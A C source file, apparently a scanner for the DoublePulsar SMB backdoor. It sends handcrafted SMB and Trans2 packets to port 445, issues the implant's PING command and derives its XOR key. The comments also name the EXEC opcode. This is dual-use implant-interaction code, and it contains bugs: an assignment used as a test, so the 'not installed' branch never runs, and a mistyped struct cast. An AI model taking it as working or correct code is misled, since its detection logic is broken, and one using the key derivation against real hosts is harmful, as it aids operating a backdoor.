#define _CRT_SECURE_NO_WARNINGS

/*
DoublePulsar PING command using a structure
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#include <stdint.h>
#pragma comment(lib, "wsock32.lib")


unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";


unsigned char trans2_session_setup[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

#ifdef _WIN32
#pragma pack(1)
typedef struct {
//For Linux
#else
typedef struct __attribute__((__packed__)) {
#endif
	uint16_t SmbMessageType;
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4]; 
	uint8_t SmbCommand;
	uint32_t NtStatus;
	uint8_t flags; 
	uint16_t flags2;  
	uint16_t ProcessIDHigh; 
	uint8_t signature[8]; 
	uint16_t reserved;
	uint16_t TreeId;                     
	uint16_t ProcessID; 
	uint16_t UserID;
	uint16_t multipleID;                 
} TreeConnect_Response;
#ifdef _WIN32
#pragma pack(pop)
#endif

#ifdef _WIN32
#pragma pack(1)
typedef struct {
	
//For Linux
#else
typedef struct __attribute__((__packed__)) {
#endif
	//NetBIOS header -- may need to make this separate from the SMB header
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	
	//SMB header
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags; ///0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 header
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;
	
	
	unsigned char SESSION_SETUP_PARAMETERS[12];
	/*
	ULONG DataSize;
	ULONG chunksize;
	ULONG offset;
	*/
} SMB_DOUBLEPULSAR_PINGREQUEST;
#ifdef _WIN32
#pragma pack(pop)
#endif

#define SWAP_WORD(X) (((((uint32_t)(X)) >> 24) & 0x000000ff) | \
				((((uint32_t)(X)) >>  8) & 0x0000ff00) | \
							 ((((uint32_t)(X)) <<  8) & 0x00ff0000) | \
							 ((((uint32_t)(X)) << 24) & 0xff000000))

#define SWAP_SHORT(X) ( ((((uint16_t)X)& 0xff00) >> 8) | ((((uint16_t)X)& 0x00ff) << 8) )

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	unsigned int x = (2 * sig ^ (((sig & 0xff00 | (sig << 16)) << 8) | (((sig >> 16) | sig & 0xff0000) >> 8))) & 0xffffffff;
	return x;
}

void convert_name(char *out, char *name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

unsigned int LE2INT(unsigned char* data)
{
	unsigned int b;
	b = data[3];
	b <<= 8;
	b += data[2];
	b <<= 8;
	b += data[1];
	b <<= 8;
	b += data[0];
	return b;
}

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);       //get userid

	//Generates a dynamic TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char *ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$",argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char*)&userid, 2); //update userid

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
	
	//TreeConnect_Response treeresponse;
	//memcpy(&treeresponse, recvbuff, sizeof(TreeConnect_Response));
	TreeConnect_Response treeresponse = (TreeConnect_Response*)recvbuff;
	//Now treeresponse that maps to recvbuff, we can extract and use tree id & user ids
	//treeresponse->treeid;
	//treeresponse->userid;

	//set SMB values
	int total_packet_size = 82;
	SMB_DOUBLEPULSAR_PINGREQUEST* pingpacket = (SMB_DOUBLEPULSAR_PINGREQUEST*)malloc(total_packet_size);
	pingpacket->SmbMessageType = 0; //0x0000;
	//fix here because the value needs to be dynamic not static
	//pingpacket.SmbMessageLength = SWAP_SHORT(0x4e);

	pingpacket->ProtocolHeader[0] = '\xff';
	pingpacket->ProtocolHeader[1] = 'S';
	pingpacket->ProtocolHeader[2] = 'M';
	pingpacket->ProtocolHeader[3] = 'B';
	pingpacket->SmbCommand = 0x32; //Trans2 

	pingpacket->ProcessIDHigh = 0x0000;
	pingpacket->NtStatus = 0x00000000;
	pingpacket->flags = 0x18;
	pingpacket->flags2 = 0xc007;
	pingpacket->UserID = userid;  //works when we copy the recvbuff response to a WORD userid.
	//pingpacket->UserID = treeresponse.userid;
	//Treeresponse structure sucks and probably will be removed later.
	/* BUG HERE: treeresponse.UserID comes back as corrupted for some reason
	  this needs to be treeresponse.UserID;
		Will return later to this later. But currently works if both values are the same
	This is not always the case and this will need to be fixed later.  */
	pingpacket->reserved = 0x0000;
	pingpacket->ProcessID = 0xfeff; //treeresponse.ProcessID;        //treeresponse.ProcessID; //Default value:  0xfeff;
	//pingpacket.TreeId = treeresponse.TreeId;				//grab from SMB response
	pingpacket->TreeId = treeid;
	pingpacket->multipleID = 65; //0x41;

	//test this with default values:
	//pingpacket.TreeId = 2048;
	//pingpacket.UserID = 2048;

	//trans2 packet stuff
	pingpacket->wordCount = 15; // 0x0F == 15 
	pingpacket->totalParameterCount = 12; //0x0C; // should be 12
	pingpacket->totalDataCount = 0; //SWAP_SHORT(0x0000); // should be 0

	pingpacket->MaxParameterCount = 1; //SWAP_SHORT(0x0100); // should be 1
	pingpacket->MaxDataCount = 0; //SWAP_SHORT(0x0000); // should be 0
	pingpacket->MaxSetupCount = 0; //SWAP_SHORT(0);     //should be 0
	pingpacket->reserved1 = 0; //SWAP_SHORT(0);
	pingpacket->flags1 = 0x0000;

	//trying little endian format for timeout
	pingpacket->timeout = 0x00ee3401;
	//pingpacket->timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command
	//pingpacket->timeout = SWAP_WORD(0x0134ee00);    //little endian PING command
	//pingpacket->timeout = 0x0134ee00;;
	//0x866c3100 = PING command from somewhere else

	pingpacket->reserved2 = 0x0000; //SWAP_SHORT(0x0000);                 //should be 0x0000
	pingpacket->ParameterCount = 12; //0x0C;         //should be 12
	pingpacket->ParamOffset = 66; //0x0042;          //should be 66
	pingpacket->DataCount = 0; //SWAP_SHORT(0x000);          //should be 0 -> 0x0000
	pingpacket->DataOffset = 78; //0x004e;           //should be 78
	pingpacket->SetupCount = 1;						//should be 1 / 0x01
	pingpacket->reserved3 = 0; //0x00;						//should be 0x00
	pingpacket->subcommand = 0x000e;         //original 0x0e00 ( little endian format )
	pingpacket->ByteCount = 13; //0xD;          //value should be 13
	pingpacket->padding = 0; //SWAP_SHORT(0x00);			//should be 0x00

	//should probably reassign to 0x00 and not a NULL terminator
	pingpacket->signature[0] = 0;
	pingpacket->signature[1] = 0;
	pingpacket->signature[2] = 0;
	pingpacket->signature[3] = 0;
	pingpacket->signature[4] = 0;
	pingpacket->signature[5] = 0;
	pingpacket->signature[6] = 0;
	pingpacket->signature[7] = 0;
	//pingpacket->signature[8] = 0;

	//should probably reassign to 0x00 and not a NULL terminator
	pingpacket->SESSION_SETUP_PARAMETERS[0] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[1] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[2] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[3] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[4] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[5] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[6] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[7] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[8] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[9] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[10] = 0;
	pingpacket->SESSION_SETUP_PARAMETERS[11] = 0;
	//pingpacket->SESSION_SETUP_PARAMETERS[12] = 0;

	unsigned int packetSize = total_packet_size - 4;
	pingpacket->SmbMessageLength = htons(packetSize);

	printf("size of packet:  %d\n", packetSize);
	hexDump(NULL, pingpacket, total_packet_size);

	send(sock, (char*)pingpacket, total_packet_size, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	if (recvbuff[34] = 0x51)
	{
		unsigned char signature[6];
		unsigned int sig;
		//copy SMB signature from recvbuff to local buffer
		signature[0] = recvbuff[18];
		signature[1] = recvbuff[19];
		signature[2] = recvbuff[20];
		signature[3] = recvbuff[21];
		signature[4] = '\0';
		
		//used for architecture but not used at this time
		//signature[4] = recvbuff[22];
		//signature[5] = '\0';

		//process the signature
		sig = LE2INT(signature);

		//calculate the XOR key for DoublePulsar
		unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
		printf("Calculated XOR KEY:  0x%x\n", XorKey);
	}
	else {
		printf("Doublepulsar does not appear to be installed!\n");
	}

	closesocket(sock);
	WSACleanup();
	return 0;
}
